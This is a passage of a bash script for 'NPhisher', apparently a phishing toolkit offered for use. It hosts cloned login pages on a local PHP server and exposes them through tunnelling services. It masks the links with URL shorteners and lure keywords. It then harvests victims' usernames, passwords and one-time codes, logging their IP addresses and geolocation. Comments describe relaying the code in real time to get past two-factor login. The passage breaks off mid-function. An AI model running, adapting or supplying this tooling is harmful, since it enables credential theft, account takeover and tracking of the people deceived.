
##COLOUR VARIABLES

#Text
RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
ORANGE="$(printf '\033[33m')"
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
BLACK="$(printf '\033[30m')"
NC='\033[0m' #Reset colour
#Background
REDBG="$(printf '\033[41m')"
GREENBG="$(printf '\033[42m')"
ORANGEBG="$(printf '\033[43m')"
BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"
CYANBG="$(printf '\033[46m')"
WHITEBG="$(printf '\033[47m')"
BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')" #Reset background

#Directories
pro_dir=$(pwd) #project directory
server_dir="${pro_dir}/.server" #server directory
sites_dir="${pro_dir}/.sites" #sites directory
log_name=$(date +%d-%m-%Y-%H-%M-%S)

#Variables
LINK="INVALID"
#Normal Banner
banner(){
	echo " "
	echo -e "${RED} ██      ██╗${BLUE}██████╗${NC}"
	echo -e "${RED} ███╗    ██║${BLUE}██╔══██║ ${NC}"
	echo -e "${RED} ████╗   ██║${BLUE}██║  ██║██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗${NC}"
	echo -e "${RED} ██╔██╗  ██║${BLUE}██████╔╝██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗${NC}"
	echo -e "${RED} ██║ ╚██╗██║${BLUE}██╔═══╝ ███████║██║███████╗███████║█████╗  ██████╔╝${NC}"
	echo -e "${RED} ██║   ╚███║${BLUE}██║     ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗${NC}"
	echo -e "${RED} ██║    ███║${BLUE}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║${NC}"
	echo -e "${RED} ╚═╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
	echo -e "${CYAN}        ${NC} "
}
# Credits banner
cbanner(){
	echo " "
	echo -e "${RED} ██      ██╗${BLUE}██████╗${NC}"
	echo -e "${RED} ███╗    ██║${BLUE}██╔══██║ ${NC}"
	echo -e "${RED} ████╗   ██║${BLUE}██║  ██║██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗${NC}"
	echo -e "${RED} ██╔██╗  ██║${BLUE}██████╔╝██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗${NC}"
	echo -e "${RED} ██║ ╚██╗██║${BLUE}██╔═══╝ ███████║██║███████╗███████║█████╗  ██████╔╝${NC}"
	echo -e "${RED} ██║   ╚███║${BLUE}██║     ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗${NC}"
	echo -e "${RED} ██║    ███║${BLUE}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║${NC}"
	echo -e "${RED} ╚═╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
	echo -e "${CYAN}                                                  By - ${RED}Alygnt${NC}"
	echo -e "${CYAN}        ${NC} "
	echo -e "${GREEN}                           Version 1.2 ${NC}"
	echo -e "${CYAN}        ${NC} "
}
#Small Banner
sbanner(){
	echo " "
	echo -e "${RED} ▒█▄░ ▒█${BLUE} ▒█▀▀█ ${NC}"
	echo -e "${RED} ▒█▒█ ▒█${BLUE} ▒█▄▄█ █░░█ ░▀░ █▀▀ █░░█ █▀▀ █▀▀█${NC}"
	echo -e "${RED} ▒█░░█▒█${BLUE} ▒█░░░ █▀▀█ ▀█▀ ▀▀█ █▀▀█ █▀▀ █▄▄▀${NC}"
	echo -e "${RED} ▒█░░░██${BLUE} ▒█░░░ ▀░░▀ ▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀ ▀░░▀${NC}"
	echo -e "${CYAN}        ${NC} "
}

## Directories
directories(){
if [[ ! -d ".server" ]]; then
        mkdir -p ".server"
fi
if [[ ! -d "logs" ]]; then
        mkdir -p "logs"
fi
if [[ -d ".server/www" ]]; then
        rm -rf ".server/www"
        mkdir -p ".server/www"
else
        mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
        rm -rf ".cld.log"
fi
}

#Dependencies
dependencies() {
        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
                        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

        if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Packages already installed."
        else
                pkgs=(php curl wget unzip)
                for pkg in "${pkgs[@]}"; do
                        type -p "$pkg" &>/dev/null || {
                                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
                                if [[ `command -v pkg` ]]; then
                                        pkg install "$pkg" -y
                                elif [[ `command -v apt` ]]; then
                                        apt install "$pkg" -y
                                elif [[ `command -v apt-get` ]]; then
                                        apt-get install "$pkg" -y
                                elif [[ `command -v pacman` ]]; then
                                        sudo pacman -S "$pkg" --noconfirm
                                elif [[ `command -v dnf` ]]; then
                                        sudo dnf -y install "$pkg"
                                else
                                        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
                                        { reset_color; exit 1; }
                                fi
                        }
                done
        fi

}

## Reset terminal colors
reset_color() {
        tput sgr0   # reset attributes
        tput op     # reset color

    return
}

## Exit message
msg_exit() {
        { clear; banner; echo; }
        echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
        { reset_color; exit 0; }
}

## Kill already running process
kill_pid() {
        if [[ `pidof php` ]]; then
                killall php > /dev/null 2>&1
        fi
        if [[ `pidof ngrok` ]]; then
                killall ngrok > /dev/null 2>&1
        fi
        if [[ `pidof cloudflared` ]]; then
                killall cloudflared > /dev/null 2>&1
        fi
}

#check whether execute permission is granted
xpermission(){
	if [[ -x "nphisher.sh" ]];then
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
	else
	        chmod 777 nphisher.sh
	        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
	fi
}

#check for updates
check_net_update(){
	check_netstats
	if [ $netstats=="Online" ]; then
		check_update
	else
		echo "${RED}Your offline, Check your internet and try again."
		sleep 5
		mainmenu
	fi
}
check_update() {
	rm -rf version.txt
	rm -rf core/update/tmp/version.txt

	wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/NPhisher/main/core/update/version.txt > /dev/null 2>&1
	mv version.txt core/update/tmp

	current_ver=$( cat core/update/version.txt )
	lat_ver=$( cat core/update/tmp/version.txt )
	if [ $current_ver == $lat_ver ]; then
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Your up to date!! ${NC} "
		{ sleep 3; clear; mainmenu; }
	else
		echo " "
		echo "${GREEN} Current version = ${YELLOW} $current_ver "
		echo "${GREEN} Latest version = ${YELLOW} $lat_ver "
		read -p "${GREEN}[${WHITE}#${GREEN}]${GREEN} Update found!! (Latest Version ${lat_ver} ) Do you want to update? (y/n) :"  ureply
		case $ureply in
			Y | y)
				update;;
			N | n)
				{ clear;  mainmenu; };;

		esac
	fi
}

update() {
	echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} UPDATING ${NC}"
	mkdir $HOME/nphisher
	if [ -e .server/ngrok ]; then
		mv .server/ngrok $HOME/nphisher
	fi
	if [ -e .server/cloudflared ]; then
        	mv .server/cloudflared $HOME/nphisher
	fi

	cd ..
	rm -rf NPhisher
	echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} REINSTALLING THE TOOL ${NC} "
	git clone https://github.com/Alygnt/NPhisher

	if [ -d NPhisher ]; then
		cd NPhisher
	        mv $HOME/nphisher/ngrok .server
	        mv $HOME/nphisher/cloudflared .server
	        rm -rf $HOME/nphisher
	        credits_banner
		echo " "
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} SUCCESSFULLY UPDATED!! ( Version: ${lat_ver} ) ${NC} "
	        sleep 0.3
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Now running the tool!! ${NC} "
	        sleep 2
	        bash nphisher.sh
		echo  " "
	else
		echo -e "\n${GREEN}[${WHITE}!${GREEN}]${RED} SORRY, ERROR OCCURED!! TRY REINSTALLING MANUALLY!! ${NC} "
	fi

}


## Shortcut
shortut_check() {
	if [[ -s "/bin/nphisher" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Shortcut is active."
	else
		shortcut
	fi
}
shortcut() {
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Do you want to setup shortcut (Y/n) : ${BLUE}" shortcut_reply
		case $shortcut_reply in
		Y | y)
			shortcut_setup;;
		N | n)
			echo "";;
		*)
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${RED} Invaild option try again."
			shortcut_check;;
		esac
}
shortcut_setup() {
	rm -rf /bin/nphisher
	shortcutcmd = "pro_dir = ${pro_dir}"
	if [[ -d '${pro_dir}' ]]; then
		bash ${pro_dir}/nphisher.sh
	else
		echo -e "\n [-] NPhisher directory not found. It maybe moved or deleted try downloading NPhisher again. "
	fi
	echo ${shortcutcmd} >> nphisher
	chmod 777 nphisher
	mv nphisher /bin
}

## URL MASKING
MASKING() { #4 last one using url shortner apis
	RESPONSE=$(wget -nv --spider https://is.gd 2>&1 | awk '{print $5}')
	#getting response from is.gd
	if [[ ${RESPONSE} == "200" ]];then
		SITE=$(curl -s https://is.gd/create.php\?format\=simple\&url=${LINK})
		if [[ ${SITE} == https://is.gd/[-0-9a-zA-Z]* ]]; then #RE-CHECKING For a valid url somtimes site goes down!!
			MASK_SUFfix=${SITE#https://}
		else #as a backup shortner
			SITE=$(curl -s https://api.shrtco.de/v2/shorten?url=${LINK} >> site.log)
			grep -o 'https:[^"]*' site.log >> bURI;rm log.URI;sed 's/\\//g' bURI >> .uri.log;rm bURI
			MASK_SUFfix=$(grep -o '9qr.de/[-0-9a-zA-Z]*' ".uri.log")
		fi
	else
		echo "${GREEN}[${WHITE}!${GREEN}]${GREEN}Error occured while masking try again"
		sleep 5
		cusurl
	fi
	{ clear; sbanner; }
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}${LINK}"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${ORANGE} MASKED URL : ${GREEN}${CUS_URL}-${Keystks}@${MASK_SUFfix}${GREEN}"
}

checkurl() { #3 checking for HTTP|S or WWW input type is valid or not.
	if [[ ! "${1//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
		if [[  "${1::3}" != 'www' ]]; then
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid URL | USE www/http or https insted of : ${CUS_URL}"
			{ sleep 1.5; clear; banner; cusurl; }
		fi
	fi
}

cusurl(){
	echo " "
	echo -ne "${RED}[${WHITE}-${RED}]${ORANGE} Do You want to Customize the uRL BeLow?"
	echo " "
	read -p "${RED}[${WHITE}-${RED}]${ORANGE} $LINK (Y/n):${ORANGE}" CUS_URI
	case $CUS_URI in
                Y | y)
			read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN}Enter Your Custom uRL (eg:https://google.com | www.google.com):" CUS_URL
                	checkurl ${CUS_URL}
        	        echo " "
	                read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${ORANGE})${GREEN} : ${ORANGE}" Keystks #KEY_STOCKS
                	if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
	                        MASKING
        	        else
                        	echo -ne "\n\a\a${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid Input : ${Keystks}"
                	        { sleep 1.5; clear; banner; cusurl; }
        	        fi;;
                N | n | *)
                        { clear; sbanner; }
	                echo " "
                	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}${LINK}"
        	        echo " ";;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Try again!!!\a\a"
	                { clear; banner; cusurl; }
                esac
}

checklink() {
	if [ ${LINK}=="" ]; then
		clear
		banner
		echo " "
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error in generating the link"
		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Starting localhost. You might need to start tunneler manually"
		sleep 6
		start_localhost
	else
		cusurl
	fi
}

## Install ngrok
check_ngrok(){
	if [ ! -e ".server/ngrok" ]; then
		echo " "
		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Ngrok Not installed do you want to install ngrok now? (Y/n) : ${BLUE}"
		case $REPLY in
		Y | y)
			install_ngrok
			ngrok_token_check;;

		N | n | *)
			tunnelmenu;;

		esac
	else
		ngrok_token_check
	fi
}
install_ngrok() {
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
		else
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
		fi
}
##Ngrok token auth
ngrok_token_check(){
        if [ -s "${HOME}/.ngrok2/ngrok.yml" ]; then
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok Authtoken setup is already done."
		start_ngrok
        else
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Setting up authtoken"
                ngrok_token_setup
        fi
}
ngrok_token_setup(){
        if [[ -d "${HOME}/.ngrok2/" ]]; then
               echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok2 directory exists!!"
        else
               mkdir $HOME/.ngrok2
               echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Created Ngrok2 directory "
		echo " "
        fi

        if [[ -s "${HOME}/.ngrok2/ngrok.yml" ]]; then
               rm -rf ${HOME}/.ngrok2/ngrok.yml
               read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
               authline="authtoken : ${ntoken}"
               echo "$authline" >> ngrok.yml
               mv ngrok.yml ${HOME}/.ngrok2/
        else
               read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
               echo "authtoken : ${ntoken}" >> ngrok.yml
               mv ngrok.yml ${HOME}/.ngrok2/
        fi
	start_ngrok
}
## Start ngrok
start_ngrok() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        { sleep 1; setup_site; }
        echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot .server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    else
        sleep 2 && .server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

        { sleep 8; clear; banner; }
##        ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
	LINK="${ngrok_url}"
	checklink
        capture_data_check
}

## Install Cloudflared
check_cloudflared(){
	if [ ! -e ".server/cloudflared" ]; then
		echo " "
		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Cloudflared Not installed do you want to install Cloudflared now? (Y/n) : ${BLUE}"
		case $REPLY in
		Y | y)
			install_cloudflared
			start_cloudflared;;
		N | n | *)
			tunnelmenu;;
		esac
	else
                start_cloudflared
	fi
}
install_cloudflared() {
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
}
## Start Cloudflared
start_cloudflared() {
        rm .cld.log > /dev/null 2>&1 &
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        { sleep 1; setup_site; }
        echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
                sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

        { sleep 8; clear; banner; }

	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	LINK="${cldflr_link}"
	checklink
        capture_data_check
}

## Install LocalXpose
check_localxpose(){
	if [ ! -e ".server/loclx" ]; then
		echo " "
		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Localxpose Not installed do you want to install localxpose now? (Y/n) : ${BLUE}"
		case $REPLY in
		Y | y)
			install_localxpose
			token_localxpose
			start_loclx;;

		N | n | *)
			tunnelmenu;;

		esac
	else
		start_loclx
	fi
}
install_localxpose() {
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
}
token_localxpose() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
		sleep 3
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Loclx Token :${ORANGE} " loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnelmenu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}
## Start LocalXpose
start_loclx() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -e "\n"
	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	else
		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	fi

	{ sleep 12; clear; banner; }
	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
	LINK="${loclx_url}"
	checklink
	capture_data_check
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

## Start localhost
start_localhost() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        setup_site
        { sleep 1; clear; banner; }
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
        capture_data_check
}

#Host and port setup
HOST='127.0.0.1'
cusport() {
	echo " "
	echo "${RED}[${WHITE}-${RED}]${GREEN}Your current port : ${BLUE}4444"
	read -p "${RED}[${WHITE}?${RED}]${GREEN}Do you want to setup Custom port (Y/n) : ${BLUE}"
	case $REPLY in
	Y | y)
		read -p "${RED}[${WHITE}?${RED}]${GREEN}Type your Custom port : ${BLUE}" cport
		PORT="${cport}";;

	N | n )
		PORT="4444";;
	*)
		PORT="4444";;
	esac
}
## Setup website and start php server
setup_site() {
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
        cp -rf .sites/"$website"/* .server/www
	cusport
        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
        cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Get IP address
capture_ip() {
        IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
        IFS=$'\n'
        echo -e "\n${RED} Victim's IP : ${RED}$IP"
	if [ reply_tunnel=1 ]; then
		echo -ne "${RED} IP details cannot be captured in localhost server"
		echo " "
		save_ip
		rm -rf .server/www/ip.txt
	elif [ reply_tunnel=01 ]; then
		echo -ne "${RED} IP details cannot be captured in localhost server"
		echo " "
		save_ip
		rm -rf .server/www/ip.txt
	else
		ip_details
		save_ip
	fi
}
save_ip() {
	cat .server/dumps/space.txt >> ${log_name}.txt
	cat .server/dumps/line.txt >> ${log_name}.txt
	cat .server/www/ip.txt >> ${log_name}.txt
	mv ${log_name}.txt logs
	echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} /logs/${log_name}.txt"
}
ip_details() {
	IFS='\n'
	iptracker=$(curl -s -L "http://ipwhois.app/json/$IP" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > location.txt &&  grep -o '"[^"]*"\s*:\s*"[^"]*"' location.txt > "${pro_dir}/track.txt")
	IFS=$'\n'
	iptt=$(sed -n 's/"ip"://p' "${pro_dir}/track.txt")

	if [[ $iptt != "" ]]; then
		echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
	fi
	iptype=$(sed -n 's/"type"://p' "${pro_dir}/track.txt")
	if [[ $iptype != "" ]]; then
		echo -e "\n${GREEN} IP type: ${NC} $iptype"
	fi
	latitude=$(sed -n 's/"latitude"://p' "${pro_dir}/track.txt")
	if [[ $latitude != "" ]]; then
		echo -e  "\n${GREEN} Latitude:  ${NC} $latitude"
	fi
	longitude=$(sed -n 's/"longitude"://p' "${pro_dir}/track.txt")
	if [[ $longitude != "" ]]; then
		echo -e  "\n${GREEN} Longitude:  ${NC} $longitude"
	fi
	city=$(sed -n 's/"city"://p' "${pro_dir}/track.txt")
	if [[ $city != "" ]]; then
		echo -e "\n${GREEN} City: ${NC} $city"
	fi
	isp=$(sed -n 's/"isp"://p' "${pro_dir}/track.txt")
	if [[ $isp != "" ]]; then
		echo -e "\n${GREEN} Isp: ${NC} $isp"
	fi
	country=$(sed -n 's/"country"://p' "${pro_dir}/track.txt")
	if [[ $country != "" ]]; then
		echo -e  "\n${GREEN} Country: ${NC} $country"
	fi
	flag=$(sed -n 's/"country_flag"://p' "${pro_dir}/track.txt")
	if [[ $flag != "" ]]; then
		echo -e "\n${GREEN} Country flag: ${NC} $flag"
	fi
	cap=$(sed -n 's/"country_capital"://p' "${pro_dir}/track.txt")
	if [[ $cap != "" ]]; then
		echo -e "\n${GREEN} Country capital: ${NC} $cap"
	fi
	phon=$(sed -n 's/"country_phone"://p' "${pro_dir}/track.txt")
	if [[ $phon != "" ]]; then
		echo -e "\n${GREEN} Country code: ${NC} $phon"
	fi
	continent=$(sed -n 's/"continent"://p' "${pro_dir}/track.txt")
	if [[ $continent != "" ]]; then
		echo -e  "\n${GREEN} Continent:  ${NC} $continent"
	fi
	ccode=$(sed -n 's/"currency_code"://p' "${pro_dir}/track.txt")
	if [[ $ccode != "" ]]; then
		echo -e "\n${GREEN} Currency code: ${NC} $ccode"
	fi
	region=$(sed -n 's/"region"://p' "${pro_dir}/track.txt")
	if [[ $region != "" ]]; then
		echo -e "\n${GREEN} State: ${NC} $region"
	fi
	cat "${pro_dir}/track.txt" >> "${log_name}.txt"
	rm -rf "${pro_dir}/track.txt"
}
#Capture data check
capture_data_check(){
	if [ -f .sites/$website/NOTP ];then
                capture_data_1
        elif [ -f .sites/$website/OOTP ];then
                capture_data_2
        elif [ -f .sites/$website/POTP ];then
                capture_data_3
	else
		echo " Error Occured!!"
        fi

#no 1- id pass
# no 2 - id otp
# no 3 - id pass otp
}

## Get credentials
capture_id() {
	echo "${RED}"
        cat .server/www/usernames.txt
        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
	cat .server/dumps/space.txt >> "logs/${log_name}.txt"
        cat .server/www/usernames.txt >> "logs/${log_name}.txt"
	rm -rf .server/www/usernames.txt
}

## Get credentials
capture_pass() {
	echo "${RED}"
	cat  .server/www/pass.txt
        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
	cat .server/dumps/space.txt >> logs/${log_name}.txt
        cat .server/www/pass.txt >> logs/${log_name}.txt
	rm -rf .server/www/pass.txt
}

## Get otp
capture_otp() {
	echo "${RED}"
        cat  .server/www/otp.txt
        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
	cat .server/dumps/space.txt >> logs/${log_name}.txt
        cat .server/www/otp.txt >> logs/${log_name}.txt
	rm -rf .server/www/otp.txt
}

## Print data no otp
capture_data_1() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
                if [[ -e ".server/www/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip
                fi
                sleep 0.75
                if [[ -e ".server/www/usernames.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !"
                        capture_id
			capture_pass
			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
                fi
                sleep 0.75
	done
}

## Print data otp
capture_data_2() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
                if [[ -e ".server/www/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip
                fi
                sleep 0.75
                if [[ -e ".server/www/usernames.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
                        capture_id
			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for OTP>"
			echo -ne "\n${WHITE} NOTE : OTP WON'T BE SENT AUTOMATICALLY, ONCE YOU LOGIN IN OFFICAL WEBSITE, THAT OTP WILL BE SENT TO VICTIM"
                fi
		if [[ -e ".server/www/otp.txt" ]]; then
			echo -ne "\n\n${GREEN} OTP Found !"
                        capture_otp
			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
                fi
                sleep 0.75
	done
}

## Print data notp & otp
capture_data_3() {
